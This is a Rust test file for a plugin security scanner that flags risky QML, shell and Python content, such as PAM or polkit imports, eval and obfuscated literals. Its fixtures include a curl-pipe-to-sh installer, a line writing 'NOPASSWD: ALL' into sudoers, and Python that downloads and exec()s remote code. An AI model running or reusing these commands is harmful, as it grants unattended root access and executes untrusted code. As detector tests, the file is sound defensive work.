use crate::detect::*;
use omasafe_core::bounds::TimeBudget;
use omasafe_report::analysis::AnalysisSection;

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

pub(crate) fn run(
    entries: Vec<PayloadEntry>,
    contents: &[(&str, &[u8])],
) -> (AnalysisArtifacts, PayloadInventory) {
    let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
        .iter()
        .map(|(path, bytes)| ((*path).to_owned(), bytes.to_vec()))
        .collect();
    let mut inventory = PayloadInventory {
        entries,
        ..Default::default()
    };
    let artifacts = analyze_inventory(
        &mut inventory,
        &|entry| lookup.get(&entry.relative_path).cloned(),
        &TimeBudget::default(),
    );
    (artifacts, inventory)
}

pub(crate) fn rule_ids(artifacts: &AnalysisArtifacts) -> Vec<String> {
    artifacts
        .rendered_findings()
        .iter()
        .map(|finding| finding.rule_id.clone())
        .collect()
}

#[test]
fn priority_surface_imports_are_immediate_high_findings() {
    let source = r#"import QtQuick
import Quickshell.Services.Pam
Item { WlSessionLock { surface: lockSurface } }
"#;
    let (artifacts, inventory) = run(
        vec![entry("Lock.qml", PayloadKind::Qml, source.len())],
        &[("Lock.qml", source.as_bytes())],
    );
    let ids = rule_ids(&artifacts);
    assert!(
        ids.contains(&"oma.qml.pam-authentication".to_owned()),
        "{ids:?}"
    );
    assert!(ids.contains(&"oma.qml.session-lock".to_owned()), "{ids:?}");
    for finding in artifacts.rendered_findings() {
        if finding.rule_id.starts_with("oma.qml.pam")
            || finding.rule_id.starts_with("oma.qml.session")
            || finding.rule_id.starts_with("oma.qml.polkit")
        {
            assert_eq!(finding.severity, "high");
        }
    }
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
}

#[test]
fn polkit_import_is_a_high_finding_without_usage() {
    let source = "import Quickshell.Services.Polkit\nItem {}\n";
    let (artifacts, _) = run(
        vec![entry("Agent.qml", PayloadKind::Qml, source.len())],
        &[("Agent.qml", source.as_bytes())],
    );
    let findings = artifacts.rendered_findings();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "oma.qml.polkit-agent-ui");
    assert_eq!(findings[0].severity, "high");
}

#[test]
fn benign_qml_stays_free_of_priority_findings() {
    let source = r#"import QtQuick
Text { text: "hello"; clipboardHelper: false }
Timer { running: true }
"#;
    let (artifacts, _) = run(
        vec![entry("Calm3.qml", PayloadKind::Qml, source.len())],
        &[("Calm3.qml", source.as_bytes())],
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
}

#[test]
fn dynamic_code_construction_is_detected() {
    let source = r#"Item {
    Component.onCompleted: {
        var panel = Qt.createQmlObject(panelSource, root, "dyn");
        var handler = eval(userInput)
    }
}
"#;
    let (artifacts, _) = run(
        vec![entry("Dyn2.qml", PayloadKind::Qml, source.len())],
        &[("Dyn2.qml", source.as_bytes())],
    );
    let ids = rule_ids(&artifacts);
    assert_eq!(
        ids.iter()
            .filter(|id| *id == "oma.qml.dynamic-code")
            .count(),
        2,
        "both constructions surface: {ids:?}"
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "dynamic-code-execution")
    );
}

#[test]
fn encoded_literal_indicator_has_boundary() {
    // Boundary below the threshold stays silent.
    let short = format!("Item {{ property string p: \"{}\" }}", "ab12".repeat(15)); // 60 chars
    let (artifacts_short, _) = run(
        vec![entry("Short.qml", PayloadKind::Qml, short.len())],
        &[("Short.qml", short.as_bytes())],
    );
    assert!(
        !rule_ids(&artifacts_short).contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
    );

    // At/over the threshold with base64 shape surfaces an indicator.
    let long_payload = format!("{}{}{}", "a".repeat(32), "9".repeat(32), "=="); // 66 chars
    let long_source = format!("Item {{ property string p: \"{long_payload}\" }}");
    let (artifacts_long, _) = run(
        vec![entry("Long.qml", PayloadKind::Qml, long_source.len())],
        &[("Long.qml", long_source.as_bytes())],
    );
    let ids = rule_ids(&artifacts_long);
    assert!(
        ids.contains(&"oma.qml.obfuscated-payload-indicator".to_owned()),
        "{ids:?}"
    );

    // Prose of the same length is not base64-shaped.
    let prose = format!("Item {{ property string p: \"{}\" }}", "word ".repeat(20));
    let (artifacts_prose, _) = run(
        vec![entry("Prose.qml", PayloadKind::Qml, prose.len())],
        &[("Prose.qml", prose.as_bytes())],
    );
    assert!(
        !rule_ids(&artifacts_prose).contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
    );
}

#[test]
fn persistence_location_writes_surface_as_context_findings() {
    let source = "FileView { path: \".config/autostart/persist.desktop\" }\n";
    let (artifacts, _) = run(
        vec![entry("Persist.qml", PayloadKind::Qml, source.len())],
        &[("Persist.qml", source.as_bytes())],
    );
    let findings = artifacts.rendered_findings();
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == PERSISTENCE_RULE
                && finding.severity == "info"
                && finding.evidence.starts_with("persistence-location"))
    );
}

#[test]
fn shell_download_execute_and_sudoers_are_high_findings() {
    let installer = r#"#!/bin/sh
curl https://example.test/install.sh | sh
echo "NOPASSWD: ALL" > /etc/sudoers.d/omarchy-helper
sudo pacman -S --noconfirm somepackage
"#;
    let (artifacts, inventory) = run(
        vec![entry("install.sh", PayloadKind::Shell, installer.len())],
        &[("install.sh", installer.as_bytes())],
    );
    let ids = rule_ids(&artifacts);
    assert!(
        ids.contains(&"oma.script.download-execute".to_owned()),
        "{ids:?}"
    );
    assert!(
        ids.contains(&"oma.script.privilege-escalation".to_owned()),
        "{ids:?}"
    );
    for finding in artifacts.rendered_findings() {
        if finding.rule_id.starts_with("oma.script.") {
            assert_eq!(finding.severity, "high");
            assert_eq!(finding.confidence.as_deref(), Some("lexical-fallback"));
        }
    }
    // Plain package-manager/sudo usage is capability-level context.
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "process-execution")
    );
    // Shell payloads are always labelled partial.
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
}

#[test]
fn python_variants_cover_the_same_families() {
    let helper = r#"import urllib.request
data = urllib.request.urlopen("https://example.test/x").read(); exec(data)
sudo pacman -S base-devel
"#;
    let (artifacts, _) = run(
        vec![entry("setup.py", PayloadKind::Python, helper.len())],
        &[("setup.py", helper.as_bytes())],
    );
    let ids = rule_ids(&artifacts);
    assert!(
        ids.contains(&"oma.python.download-execute".to_owned()),
        "{ids:?}"
    );
    // Plain sudo without sudoers/NOPASSWD is a capability, not a finding.
    assert!(
        !ids.contains(&"oma.python.privilege-escalation".to_owned()),
        "{ids:?}"
    );
}

#[test]
fn benign_scripts_have_no_findings_but_stay_partial() {
    let script = "#!/bin/sh\necho hello\nnotify-send done\n";
    let (artifacts, inventory) = run(
        vec![entry("clean.sh", PayloadKind::Shell, script.len())],
        &[("clean.sh", script.as_bytes())],
    );
    assert!(rule_ids(&artifacts).is_empty());
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
}

#[test]
fn manifest_kinds_feed_context_results_and_headless_capability() {
    let manifest = br#"{"id":"x","kinds":["bar","service"]}"#;
    let qml_source = "Text {}\n";
    let (artifacts, _) = run(
        vec![
            entry("manifest.json", PayloadKind::TextFile, manifest.len()),
            entry("plugin.qml", PayloadKind::Qml, qml_source.len()),
        ],
        &[
            ("manifest.json", manifest),
            ("plugin.qml", qml_source.as_bytes()),
        ],
    );
    let ids = rule_ids(&artifacts);
    assert!(ids.contains(&REPLACES_BAR_RULE.to_owned()), "{ids:?}");
    let rendered_findings = artifacts.rendered_findings();
    let replaces_bar = rendered_findings
        .iter()
        .find(|finding| finding.rule_id == REPLACES_BAR_RULE)
        .unwrap();
    assert_eq!(replaces_bar.severity, "info");
    assert_eq!(replaces_bar.language, "context");
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(
                |capability| capability.capability == "persistence-scheduling"
                    && capability.detail == "headless-service-kind"
            )
    );
}

#[test]
fn priority_ordering_puts_critical_and_high_first() {
    let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
    let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
    let (artifacts, _) = run(
        vec![
            entry("M.qml", PayloadKind::Qml, medium_source.len()),
            entry("H.qml", PayloadKind::Qml, high_source.len()),
        ],
        &[
            ("M.qml", medium_source.as_bytes()),
            ("H.qml", high_source.as_bytes()),
        ],
    );
    let all_findings = artifacts.rendered_findings();
    let severities: Vec<&str> = all_findings
        .iter()
        .map(|finding| finding.severity.as_str())
        .collect();
    let mut sorted = severities.clone();
    let rank = |value: &str| match value {
        "critical" => 4,
        "high" => 3,
        "medium" => 2,
        "low" => 1,
        _ => 0,
    };
    sorted.sort_by_key(|value| std::cmp::Reverse(rank(value)));
    assert_eq!(severities, sorted, "priority ordering violated");
}

#[test]
fn equivalence_map_records_marketplace_baseline_v3() {
    let map = crate::EquivalenceMap::embedded();
    assert_eq!(map.external_ruleset_version, "3");
    assert!(map.is_stale_against("4"));
    let section = AnalysisSection::new(
        crate::policy_identity(),
        String::new(),
        Vec::new(),
        Vec::new(),
        Vec::new(),
        Vec::new(),
        parser_metadata(),
        Some(omasafe_report::analysis::EquivalenceSummary {
            map_version: map.map_version.clone(),
            external_system: map.external_system.clone(),
            external_ruleset_name: map.external_ruleset_name.clone(),
            external_ruleset_version: map.external_ruleset_version.clone(),
        }),
    );
    let rendered = serde_json::to_string(&section).unwrap();
    assert!(rendered.contains("\"external_ruleset_version\":\"3\""));
}
